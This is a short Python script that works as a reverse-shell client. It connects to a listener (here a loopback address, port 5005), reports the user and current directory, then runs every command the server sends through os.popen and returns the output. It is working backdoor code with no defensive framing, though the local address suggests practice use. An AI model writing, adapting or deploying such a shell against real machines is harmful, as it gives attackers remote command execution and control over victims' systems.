import socket
from subprocess import PIPE, Popen
import os
import sys
# Create a socket object 
s = socket.socket()          
  
# Define the port on which you want to connect 
port = 5005               
buff=1024*10
uname=os.popen('who').read()
cwdToSend=os.popen('pwd').read()
massage = uname[:uname.find(" ")] + " : "+cwdToSend
print(massage)
s.connect(('127.0.0.5', port))
s.send(massage.encode())
positive=0
while massage != "exit" :  
	# connect to the server on local computer  
    data=s.recv(buff) 
    cmd = data.decode() 
    print("server : ",cmd)
    if cmd[0:2] == "cd":
        scmd=cmd.split(" ")
        scmd=scmd[1]
        os.chdir(scmd)
        uname=os.popen('who').read()
        cwdToSend=os.popen('pwd').read()
        massage = uname[:uname.find(" ")] + " : "+cwdToSend
    else:	     
	    massage=os.popen(cmd).read()
    if len(massage) > 0 and massage != "exit":
	    s.send(massage.encode())
    else :
	    s.send("Command Not Found".encode())
    positive +=1
    if positive >100 :
	    break
s.close()
